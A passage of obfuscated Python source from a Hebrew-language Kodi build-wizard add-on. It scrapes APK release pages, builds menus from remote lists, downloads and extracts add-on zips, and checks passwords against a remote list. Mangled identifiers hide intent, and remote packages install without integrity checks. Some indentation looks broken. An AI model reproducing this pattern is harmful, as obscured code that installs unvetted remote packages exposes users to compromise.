		OO0OO00OOOOO00O00 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO0OOO0OOO00OOO00 )#line:2761
		O0OOO0O000000OOO0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O0O00O0O0O000O0OO )#line:2762
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2764
		O0000OOO000O0O00O =False #line:2765
		for O0O0O0OOO000OO00O ,name ,O0O0OO0000O000OO0 ,O000O00OOO0OO000O in OO0OO00OOOOO00O00 :#line:2766
			if O0O0O0OOO000OO00O in ['../','old/']:continue #line:2767
			if not O0O0O0OOO000OO00O .endswith ('.apk'):continue #line:2768
			if not O0O0O0OOO000OO00O .find ('_')==-1 and O0000OOO000O0O00O ==True :continue #line:2769
			try :#line:2770
				OOOO0OOO0O00OO0O0 =name .split ('-')#line:2771
				if not O0O0O0OOO000OO00O .find ('_')==-1 :#line:2772
					O0000OOO000O0O00O =True #line:2773
					OOOOO00OO0000OO00 ,O00OO0O00OOO0O000 =OOOO0OOO0O00OO0O0 [2 ].split ('_')#line:2774
				else :#line:2775
					OOOOO00OO0000OO00 =OOOO0OOO0O00OO0O0 [2 ]#line:2776
					O00OO0O00OOO0O000 =''#line:2777
				O0O000O0OO0OOOOOO ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0OOO0O00OO0O0 [0 ].title (),OOOO0OOO0O00OO0O0 [1 ],O00OO0O00OOO0O000 .upper (),OOOOO00OO0000OO00 ,COLOR2 ,O0O0OO0000O000OO0 .replace (' ',''),COLOR1 ,O000O00OOO0OO000O )#line:2778
				O0OOO0O000OOOOOO0 =urljoin (O0OO0O00O000O0O00 ,O0O0O0OOO000OO00O )#line:2779
				addFile (O0O000O0OO0OOOOOO ,'apkinstall',"%s v%s%s %s"%(OOOO0OOO0O00OO0O0 [0 ].title (),OOOO0OOO0O00OO0O0 [1 ],O00OO0O00OOO0O000 .upper (),OOOOO00OO0000OO00 ),O0OOO0O000OOOOOO0 )#line:2780
				OOO000OOO00OO0OO0 +=1 #line:2781
			except :#line:2782
				wiz .log ("Error on: %s"%name )#line:2783
		for O0O0O0OOO000OO00O ,name ,O0O0OO0000O000OO0 ,O000O00OOO0OO000O in O0OOO0O000000OOO0 :#line:2785
			if O0O0O0OOO000OO00O in ['../','old/']:continue #line:2786
			if not O0O0O0OOO000OO00O .endswith ('.apk'):continue #line:2787
			if not O0O0O0OOO000OO00O .find ('_')==-1 :continue #line:2788
			try :#line:2789
				OOOO0OOO0O00OO0O0 =name .split ('-')#line:2790
				O0O000O0OO0OOOOOO ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0OOO0O00OO0O0 [0 ].title (),OOOO0OOO0O00OO0O0 [1 ],OOOO0OOO0O00OO0O0 [2 ],COLOR2 ,O0O0OO0000O000OO0 .replace (' ',''),COLOR1 ,O000O00OOO0OO000O )#line:2791
				O0OOO0O000OOOOOO0 =urljoin (O00000O0O0OO00OOO ,O0O0O0OOO000OO00O )#line:2792
				addFile (O0O000O0OO0OOOOOO ,'apkinstall',"%s v%s %s"%(OOOO0OOO0O00OO0O0 [0 ].title (),OOOO0OOO0O00OO0O0 [1 ],OOOO0OOO0O00OO0O0 [2 ]),O0OOO0O000OOOOOO0 )#line:2793
				OOO000OOO00OO0OO0 +=1 #line:2794
			except :#line:2795
				wiz .log ("Error on: %s"%name )#line:2796
		if OOO000OOO00OO0OO0 ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2797
	elif name =='spmc':#line:2798
		O00O000O00O0O00OO ='https://github.com/koying/SPMC/releases'#line:2799
		OO0OOO0OOO00OOO00 =wiz .openURL (O00O000O00O0O00OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2800
		OOO000OOO00OO0OO0 =0 #line:2801
		OO0OO00OOOOO00O00 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OO0OOO0OOO00OOO00 )#line:2802
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2804
		for name ,O000OOO0O0O0OO0OO in OO0OO00OOOOO00O00 :#line:2806
			O0O0OO0O0OO000000 =''#line:2807
			O0OOO0O000000OOO0 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O000OOO0O0O0OO0OO )#line:2808
			for OOOO0O000OOOOOOO0 ,OOO0O0O0OOOO0O0O0 ,O00OO00OO0000OOO0 in O0OOO0O000000OOO0 :#line:2809
				if O00OO00OO0000OOO0 .find ('armeabi')==-1 :continue #line:2810
				if O00OO00OO0000OOO0 .find ('launcher')>-1 :continue #line:2811
				O0O0OO0O0OO000000 =urljoin ('https://github.com',OOOO0O000OOOOOOO0 )#line:2812
				break #line:2813
		if OOO000OOO00OO0OO0 ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2815
def apkMenu (url =None ):#line:2817
	if url ==None :#line:2818
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2821
	if not APKFILE =='http://':#line:2822
		if url ==None :#line:2823
			OO0OOO00OO00OOO0O =wiz .workingURL (APKFILE )#line:2824
			O00O00O0OO000O000 =uservar .APKFILE #line:2825
		else :#line:2826
			OO0OOO00OO00OOO0O =wiz .workingURL (url )#line:2827
			O00O00O0OO000O000 =url #line:2828
		if OO0OOO00OO00OOO0O ==True :#line:2829
			O0000OO00O000OOOO =wiz .openURL (O00O00O0OO000O000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2830
			O0O00O0O0O0O0OO00 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0000OO00O000OOOO )#line:2831
			if len (O0O00O0O0O0O0OO00 )>0 :#line:2832
				O000OOO00O00O0O0O =0 #line:2833
				for OO0O00OOO0OO0000O ,OO00O00OOO0OOO0O0 ,url ,O00O0OO00O000O0O0 ,OO0O00OOOOO0O0000 ,OOO0O00O000OO0000 ,OO0O00OO00OO0O000 in O0O00O0O0O0O0OO00 :#line:2834
					if not SHOWADULT =='true'and OOO0O00O000OO0000 .lower ()=='yes':continue #line:2835
					if OO00O00OOO0OOO0O0 .lower ()=='yes':#line:2836
						O000OOO00O00O0O0O +=1 #line:2837
						addDir ("[B]%s[/B]"%OO0O00OOO0OO0000O ,'apk',url ,description =OO0O00OO00OO0O000 ,icon =O00O0OO00O000O0O0 ,fanart =OO0O00OOOOO0O0000 ,themeit =THEME3 )#line:2838
					else :#line:2839
						O000OOO00O00O0O0O +=1 #line:2840
						addFile (OO0O00OOO0OO0000O ,'apkinstall',OO0O00OOO0OO0000O ,url ,description =OO0O00OO00OO0O000 ,icon =O00O0OO00O000O0O0 ,fanart =OO0O00OOOOO0O0000 ,themeit =THEME2 )#line:2841
					if O000OOO00O00O0O0O <1 :#line:2842
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2843
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2844
		else :#line:2845
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2846
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2847
			addFile ('%s'%OO0OOO00OO00OOO0O ,'',themeit =THEME3 )#line:2848
		return #line:2849
	else :wiz .log ("[APK Menu] No APK list added.")#line:2850
	setView ('files','viewType')#line:2851
def addonMenu (url =None ):#line:2853
	if not ADDONFILE =='http://':#line:2854
		if url ==None :#line:2855
			OOOOOOOO0OOOO00O0 =wiz .workingURL (ADDONFILE )#line:2856
			O0OOO0OOO0000O0O0 =uservar .ADDONFILE #line:2857
		else :#line:2858
			OOOOOOOO0OOOO00O0 =wiz .workingURL (url )#line:2859
			O0OOO0OOO0000O0O0 =url #line:2860
		if OOOOOOOO0OOOO00O0 ==True :#line:2861
			OO00OO0O0OOO0OOO0 =wiz .openURL (O0OOO0OOO0000O0O0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2862
			OO0OO000O00OOO00O =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO00OO0O0OOO0OOO0 )#line:2863
			if len (OO0OO000O00OOO00O )>0 :#line:2864
				O0000O00OOO0O0OO0 =0 #line:2865
				for OOO0O0O0O00O00OO0 ,O000000O0OO000OO0 ,url ,O0000000O000OO00O ,OOO0O00O0OO0000O0 ,OO0O0OO0O0O00O0O0 ,OO0O0000000OOO000 ,O0O00OOO0000O00OO ,O0OO0O00000OO0OOO ,O00OO0000000000O0 in OO0OO000O00OOO00O :#line:2866
					if O000000O0OO000OO0 .lower ()=='section':#line:2867
						O0000O00OOO0O0OO0 +=1 #line:2868
						addDir ("[B]%s[/B]"%OOO0O0O0O00O00OO0 ,'addons',url ,description =O00OO0000000000O0 ,icon =OO0O0000000OOO000 ,fanart =O0O00OOO0000O00OO ,themeit =THEME3 )#line:2869
					else :#line:2870
						if not SHOWADULT =='true'and O0OO0O00000OO0OOO .lower ()=='yes':continue #line:2871
						try :#line:2872
							O0OO0O0000O000OOO =xbmcaddon .Addon (id =O000000O0OO000OO0 ).getAddonInfo ('path')#line:2873
							if os .path .exists (O0OO0O0000O000OOO ):#line:2874
								OOO0O0O0O00O00OO0 ="[COLOR green][Installed][/COLOR] %s"%OOO0O0O0O00O00OO0 #line:2875
						except :#line:2876
							pass #line:2877
						O0000O00OOO0O0OO0 +=1 #line:2878
						addFile (OOO0O0O0O00O00OO0 ,'addoninstall',O000000O0OO000OO0 ,O0OOO0OOO0000O0O0 ,description =O00OO0000000000O0 ,icon =OO0O0000000OOO000 ,fanart =O0O00OOO0000O00OO ,themeit =THEME2 )#line:2879
					if O0000O00OOO0O0OO0 <1 :#line:2880
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2881
			else :#line:2882
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2883
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2884
		else :#line:2885
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2886
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2887
			addFile ('%s'%OOOOOOOO0OOOO00O0 ,'',themeit =THEME3 )#line:2888
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2889
	setView ('files','viewType')#line:2890
def addonInstaller (OOOOOOO000O000O00 ,O0OOOOO00O0O000O0 ):#line:2892
	if not ADDONFILE =='http://':#line:2893
		O000OOOOO00O0OOO0 =wiz .workingURL (O0OOOOO00O0O000O0 )#line:2894
		if O000OOOOO00O0OOO0 ==True :#line:2895
			O0OO0OO000OO00OO0 =wiz .openURL (O0OOOOO00O0O000O0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2896
			O0O000OO00O00O0OO =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OOOOOOO000O000O00 ).findall (O0OO0OO000OO00OO0 )#line:2897
			if len (O0O000OO00O00O0OO )>0 :#line:2898
				for O00O0000OO0O000O0 ,O0OOOOO00O0O000O0 ,O00O0O0OO0OO0OOO0 ,O0OO0O0OO0000OOO0 ,O00O0O0OOO00OO0O0 ,O0O00O0000O0OO00O ,O0OO0O00OOOO0O0O0 ,OO0OOO0O000O0000O ,O0O000O0OO0O0O0O0 in O0O000OO00O00O0OO :#line:2899
					if os .path .exists (os .path .join (ADDONS ,OOOOOOO000O000O00 )):#line:2900
						OO0OOOOO00OO0OOO0 =['Launch Addon','Remove Addon']#line:2901
						O0O0O0000O0OOOO00 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OO0OOOOO00OO0OOO0 )#line:2902
						if O0O0O0000O0OOOO00 ==0 :#line:2903
							wiz .ebi ('RunAddon(%s)'%OOOOOOO000O000O00 )#line:2904
							xbmc .sleep (1000 )#line:2905
							return True #line:2906
						elif O0O0O0000O0OOOO00 ==1 :#line:2907
							wiz .cleanHouse (os .path .join (ADDONS ,OOOOOOO000O000O00 ))#line:2908
							try :wiz .removeFolder (os .path .join (ADDONS ,OOOOOOO000O000O00 ))#line:2909
							except :pass #line:2910
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOOOOOO000O000O00 ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2911
								removeAddonData (OOOOOOO000O000O00 )#line:2912
							wiz .refresh ()#line:2913
							return True #line:2914
						else :#line:2915
							return False #line:2916
					OO00O000O0O000OO0 =os .path .join (ADDONS ,O00O0O0OO0OO0OOO0 )#line:2917
					if not O00O0O0OO0OO0OOO0 .lower ()=='none'and not os .path .exists (OO00O000O0O000OO0 ):#line:2918
						wiz .log ("Repository not installed, installing it")#line:2919
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OOOOOOO000O000O00 ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O00O0O0OO0OO0OOO0 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2920
							O0O0000OOO00OO00O =wiz .parseDOM (wiz .openURL (O0OO0O0OO0000OOO0 ),'addon',ret ='version',attrs ={'id':O00O0O0OO0OO0OOO0 })#line:2921
							if len (O0O0000OOO00OO00O )>0 :#line:2922
								O0O0000O0O0OO0OOO ='%s%s-%s.zip'%(O00O0O0OOO00OO0O0 ,O00O0O0OO0OO0OOO0 ,O0O0000OOO00OO00O [0 ])#line:2923
								wiz .log (O0O0000O0O0OO0OOO )#line:2924
								if KODIV >=17 :wiz .addonDatabase (O00O0O0OO0OO0OOO0 ,1 )#line:2925
								installAddon (O00O0O0OO0OO0OOO0 ,O0O0000O0O0OO0OOO )#line:2926
								wiz .ebi ('UpdateAddonRepos()')#line:2927
								wiz .log ("Installing Addon from Kodi")#line:2929
								O00O0OOOOOOOO0000 =installFromKodi (OOOOOOO000O000O00 )#line:2930
								wiz .log ("Install from Kodi: %s"%O00O0OOOOOOOO0000 )#line:2931
								if O00O0OOOOOOOO0000 :#line:2932
									wiz .refresh ()#line:2933
									return True #line:2934
							else :#line:2935
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O00O0O0OO0OO0OOO0 )#line:2936
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OOOOOOO000O000O00 ,O00O0O0OO0OO0OOO0 ))#line:2937
					elif O00O0O0OO0OO0OOO0 .lower ()=='none':#line:2938
						wiz .log ("No repository, installing addon")#line:2939
						OOOOOO00O000O0OOO =OOOOOOO000O000O00 #line:2940
						OO0000O000OOO0000 =O0OOOOO00O0O000O0 #line:2941
						installAddon (OOOOOOO000O000O00 ,O0OOOOO00O0O000O0 )#line:2942
						wiz .refresh ()#line:2943
						return True #line:2944
					else :#line:2945
						wiz .log ("Repository installed, installing addon")#line:2946
						O00O0OOOOOOOO0000 =installFromKodi (OOOOOOO000O000O00 ,False )#line:2947
						if O00O0OOOOOOOO0000 :#line:2948
							wiz .refresh ()#line:2949
							return True #line:2950
					if os .path .exists (os .path .join (ADDONS ,OOOOOOO000O000O00 )):return True #line:2951
					O0000OOO0000O000O =wiz .parseDOM (wiz .openURL (O0OO0O0OO0000OOO0 ),'addon',ret ='version',attrs ={'id':OOOOOOO000O000O00 })#line:2952
					if len (O0000OOO0000O000O )>0 :#line:2953
						O0OOOOO00O0O000O0 ="%s%s-%s.zip"%(O0OOOOO00O0O000O0 ,OOOOOOO000O000O00 ,O0000OOO0000O000O [0 ])#line:2954
						wiz .log (str (O0OOOOO00O0O000O0 ))#line:2955
						if KODIV >=17 :wiz .addonDatabase (OOOOOOO000O000O00 ,1 )#line:2956
						installAddon (OOOOOOO000O000O00 ,O0OOOOO00O0O000O0 )#line:2957
						wiz .refresh ()#line:2958
					else :#line:2959
						wiz .log ("no match");return False #line:2960
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2961
		else :wiz .log ("[Addon Installer] Text File: %s"%O000OOOOO00O0OOO0 )#line:2962
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2963
def installFromKodi (O00O00O000O000O00 ,over =True ):#line:2965
	if over ==True :#line:2966
		xbmc .sleep (2000 )#line:2967
	wiz .ebi ('RunPlugin(plugin://%s)'%O00O00O000O000O00 )#line:2969
	if not wiz .whileWindow ('yesnodialog'):#line:2970
		return False #line:2971
	xbmc .sleep (1000 )#line:2972
	if wiz .whileWindow ('okdialog'):#line:2973
		return False #line:2974
	wiz .whileWindow ('progressdialog')#line:2975
	if os .path .exists (os .path .join (ADDONS ,O00O00O000O000O00 )):return True #line:2976
	else :return False #line:2977
def installAddon (OO0O0O000OO0OO0OO ,OO0O0OOOO00O00000 ):#line:2979
	if not wiz .workingURL (OO0O0OOOO00O00000 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OO0O0O000OO0OO0OO ,COLOR2 ));return #line:2980
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2981
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O000OO0OO0OO ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2982
	OO0000OO0O0O00OOO =OO0O0OOOO00O00000 .split ('/')#line:2983
	OO0O00O0OO000OO00 =os .path .join (PACKAGES ,OO0000OO0O0O00OOO [-1 ])#line:2984
	try :os .remove (OO0O00O0OO000OO00 )#line:2985
	except :pass #line:2986
	downloader .download (OO0O0OOOO00O00000 ,OO0O00O0OO000OO00 ,DP )#line:2987
	O0OO0O000OO0000OO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O000OO0OO0OO )#line:2988
	DP .update (0 ,O0OO0O000OO0000OO ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2989
	OOO0O0OO0OOOOO000 ,O0O0OO0O0O00000OO ,OOOOOO0000O00OOOO =extract .all (OO0O00O0OO000OO00 ,ADDONS ,DP ,title =O0OO0O000OO0000OO )#line:2990
	DP .update (0 ,O0OO0O000OO0000OO ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2991
	installed (OO0O0O000OO0OO0OO )#line:2992
	installDep (OO0O0O000OO0OO0OO ,DP )#line:2993
	DP .close ()#line:2994
	wiz .ebi ('UpdateAddonRepos()')#line:2995
	wiz .ebi ('UpdateLocalAddons()')#line:2996
	wiz .refresh ()#line:2997
def installDep (OOO0O0O0OOO000O0O ,DP =None ):#line:2999
	OOO00OOO0O0OO000O =os .path .join (ADDONS ,OOO0O0O0OOO000O0O ,'addon.xml')#line:3000
	if os .path .exists (OOO00OOO0O0OO000O ):#line:3001
		OOO0000O0O0O0OO00 =open (OOO00OOO0O0OO000O ,mode ='r');O0OO0O0OOOOO000OO =OOO0000O0O0O0OO00 .read ();OOO0000O0O0O0OO00 .close ();#line:3002
		O000OO000OO0OO00O =wiz .parseDOM (O0OO0O0OOOOO000OO ,'import',ret ='addon')#line:3003
		for OOO000OOOO0OOO00O in O000OO000OO0OO00O :#line:3004
			if not 'xbmc.python'in OOO000OOOO0OOO00O :#line:3005
				if not DP ==None :#line:3006
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO000OOOO0OOO00O ))#line:3007
				wiz .createTemp (OOO000OOOO0OOO00O )#line:3008
def installed (O00000O0O000000O0 ):#line:3035
	OO0O000OOO00OO0OO =os .path .join (ADDONS ,O00000O0O000000O0 ,'addon.xml')#line:3036
	if os .path .exists (OO0O000OOO00OO0OO ):#line:3037
		try :#line:3038
			O00OO0OOO0OO00O0O =open (OO0O000OOO00OO0OO ,mode ='r');O0O0OO00OOO0OO00O =O00OO0OOO0OO00O0O .read ();O00OO0OOO0OO00O0O .close ()#line:3039
			O0OO0O00OOO0OO00O =wiz .parseDOM (O0O0OO00OOO0OO00O ,'addon',ret ='name',attrs ={'id':O00000O0O000000O0 })#line:3040
			OOO000O00OO0OO0OO =os .path .join (ADDONS ,O00000O0O000000O0 ,'icon.png')#line:3041
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OO0O00OOO0OO00O [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OOO000O00OO0OO0OO )#line:3042
		except :pass #line:3043
def youtubeMenu (url =None ):#line:3045
	if not YOUTUBEFILE =='http://':#line:3046
		if url ==None :#line:3047
			OOO00OO0OO0OO00O0 =wiz .workingURL (YOUTUBEFILE )#line:3048
			OOOO0O000000OOO0O =uservar .YOUTUBEFILE #line:3049
		else :#line:3050
			OOO00OO0OO0OO00O0 =wiz .workingURL (url )#line:3051
			OOOO0O000000OOO0O =url #line:3052
		if OOO00OO0OO0OO00O0 ==True :#line:3053
			OO0OO00OOO00O0000 =wiz .openURL (OOOO0O000000OOO0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:3054
			OO000000O0O00OO00 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0OO00OOO00O0000 )#line:3055
			if len (OO000000O0O00OO00 )>0 :#line:3056
				for O0OO00OOOOOOOO0O0 ,O00O0O0O0O0OO0OOO ,url ,O0OOOOO00OO00O0OO ,O000O00O00OOOO00O ,OOO0OO00OOOOO00OO in OO000000O0O00OO00 :#line:3057
					if O00O0O0O0O0OO0OOO .lower ()=="yes":#line:3058
						addDir ("[B]%s[/B]"%O0OO00OOOOOOOO0O0 ,'youtube',url ,description =OOO0OO00OOOOO00OO ,icon =O0OOOOO00OO00O0OO ,fanart =O000O00O00OOOO00O ,themeit =THEME3 )#line:3059
					else :#line:3060
						addFile (O0OO00OOOOOOOO0O0 ,'viewVideo',url =url ,description =OOO0OO00OOOOO00OO ,icon =O0OOOOO00OO00O0OO ,fanart =O000O00O00OOOO00O ,themeit =THEME2 )#line:3061
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:3062
		else :#line:3063
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:3064
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:3065
			addFile ('%s'%OOO00OO0OO0OO00O0 ,'',themeit =THEME3 )#line:3066
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:3067
	setView ('files','viewType')#line:3068
def STARTP ():#line:3069
	O00000OO0OO0O0O00 =(ADDON .getSetting ("pass"))#line:3070
	if BUILDNAME =="":#line:3071
	 if not NOTIFY =='true':#line:3072
          O00O000O0OOO0OOOO =wiz .workingURL (NOTIFICATION )#line:3073
	 if not NOTIFY2 =='true':#line:3074
          O00O000O0OOO0OOOO =wiz .workingURL (NOTIFICATION2 )#line:3075
	 if not NOTIFY3 =='true':#line:3076
          O00O000O0OOO0OOOO =wiz .workingURL (NOTIFICATION3 )#line:3077
	OOO0O0OO00O0O0OOO =O00000OO0OO0O0O00 #line:3078
	O00O000O0OOO0OOOO =urllib2 .Request (SPEED )#line:3079
	OO0O000O00O00O0OO =urllib2 .urlopen (O00O000O0OOO0OOOO )#line:3080
	O00OOO0OO000000OO =OO0O000O00O00O0OO .readlines ()#line:3082
	O00O0OO00O000OOO0 =0 #line:3086
	for O0OOO00000000O0O0 in O00OOO0OO000000OO :#line:3087
		if O0OOO00000000O0O0 .split (' ==')[0 ]==O00000OO0OO0O0O00 or O0OOO00000000O0O0 .split ()[0 ]==O00000OO0OO0O0O00 :#line:3088
			O00O0OO00O000OOO0 =1 #line:3089
			break #line:3090
	if O00O0OO00O000OOO0 ==0 :#line:3091
					OO0O0000O0OO00OO0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:3092
					if OO0O0000O0OO00OO0 :#line:3094
						ADDON .openSettings ()#line:3096
						sys .exit ()#line:3098
					else :#line:3099
						sys .exit ()#line:3100
	return 'ok'#line:3104
def STARTP2 ():#line:3105
	OO0O0O00OO0000O0O =(ADDON .getSetting ("user"))#line:3106
	O00OOO0000000OOO0 =(UNAME )#line:3108
	OO00000O000OOOOOO =urllib2 .urlopen (O00OOO0000000OOO0 )#line:3109
	O0OOOOOO0000O0O00 =OO00000O000OOOOOO .readlines ()#line:3110
	OOO000O0O0OO00O0O =0 #line:3111
	for O0OOOOOOOO00000O0 in O0OOOOOO0000O0O00 :#line:3114
		if O0OOOOOOOO00000O0 .split (' ==')[0 ]==OO0O0O00OO0000O0O or O0OOOOOOOO00000O0 .split ()[0 ]==OO0O0O00OO0000O0O :#line:3115
			OOO000O0O0OO00O0O =1 #line:3116
			break #line:3117
	if OOO000O0O0OO00O0O ==0 :#line:3118
		O0000OO00O0O0O000 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:3119
		if O0000OO00O0O0O000 :#line:3121
			ADDON .openSettings ()#line:3123
			sys .exit ()#line:3126
		else :#line:3127
			sys .exit ()#line:3128
	return 'ok'#line:3132
def passandpin ():#line:3133
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:3134
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:3135
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:3136
def passandUsername ():#line:3137
	ADDON .openSettings ()#line:3139
def folderback ():#line:3142
    OO0OO0OO0O0000OO0 =ADDON .getSetting ("path")#line:3143
    if OO0OO0OO0O0000OO0 :#line:3144
      OO0OO0OO0O0000OO0 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:3145
      ADDON .setSetting ("path",OO0OO0OO0O0000OO0 )#line:3146
def backmyupbuild ():#line:3149
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:3153
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:3154
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:3155
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:3157
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3158
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:3159
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3161
def maintMenu (view =None ):#line:3165
	O0O0OOOOO00000OO0 ='[B][COLOR green]ON[/COLOR][/B]';OOOO0O0O00OO0OOOO ='[B][COLOR red]OFF[/COLOR][/B]'#line:3167
	O0OO000O0O0OOO0OO ='true'if AUTOCLEANUP =='true'else 'false'#line:3168
	O0000OOO0O00O0000 ='true'if AUTOCACHE =='true'else 'false'#line:3169
	O000O000O000OOO00 ='true'if AUTOPACKAGES =='true'else 'false'#line:3170
	O0O0OOOOOOO0O0O00 ='true'if AUTOTHUMBS =='true'else 'false'#line:3171
	OOO000O000O0O0OOO ='true'if SHOWMAINT =='true'else 'false'#line:3172
	OOOOOOO0OO0OOO0O0 ='true'if INCLUDEVIDEO =='true'else 'false'#line:3173
	O0OOOOOO000O0O000 ='true'if INCLUDEALL =='true'else 'false'#line:3174
	O0OOOO0O0O0O00000 ='true'if THIRDPARTY =='true'else 'false'#line:3175
	if wiz .Grab_Log (True )==False :O00O000O0OOOOO0O0 =0 #line:3176
	else :O00O000O0OOOOO0O0 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:3177
	if wiz .Grab_Log (True ,True )==False :O00OOOO00OOO0O000 =0 #line:3178
